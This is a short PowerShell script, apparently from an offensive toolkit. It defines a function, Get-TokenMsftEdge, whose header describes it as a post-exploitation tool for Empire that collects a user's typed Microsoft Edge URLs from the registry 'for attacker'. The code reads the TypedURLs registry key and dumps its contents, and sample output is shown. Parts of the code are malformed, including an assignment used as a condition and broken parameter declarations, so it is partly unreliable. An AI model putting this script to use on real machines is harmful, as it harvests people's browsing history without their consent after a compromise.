<#
 .Author Matt Homjxi0e @matthomjxiex02x
 .License PS Not More 
 .Optional Dependencies: None 
 .Required Dependencies: None
 
 
 .Synopsis
 Sniffer Every URLS the Users Browser Microsoft Edge From location Storage in Registry drag URLS For Attacker
 Note: This Operation Valid For Post Exploitation Empire =!-! 
 .Example
   PS:> Get-TokenMsftEdge -CommandEx NULL -CommandEx NULL
 .Result
  url1         :any login
  url2         : any login
  url3         : any login
  url4         : any login
  url5         : any login
  url6         : any login
  url9         : any login
  url10        : 
  url11        : 
  url12        : 
  url13        : 
  url14        : 
  url15        : 
  url16        : 
  PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\C
                lasses\Local Settings\Software\Microsoft\Windows\CurrentVersion\
                AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\Micro
                softEdge\TypedURLs
  PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\C
                lasses\Local Settings\Software\Microsoft\Windows\CurrentVersion\
                AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\Micro
                softEdge
  PSChildName  : TypedURLs
  PSDrive      : HKCU
  PSProvider   : Microsoft.PowerShell.Core\Registry
 end Everything
#> 

function Get-TokenMsftEdge {

    [CmdletBinding(SupportsPaging = $true)]    
    param( 
            [Parameter(Mandatory=$True,Position=0)]

                [parameter(Mandatory=$true,ParameterSetName="NULL")]
   
            [System.String]$CommandEx,$pa
)

if ($null = $CommandEx) {

$SnifferEdgedrag = Join-Path -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\" -ChildPath TypedURLs

Get-ItemProperty -Path $SnifferEdgedrag 
   ( Out-String )
  
  }

}
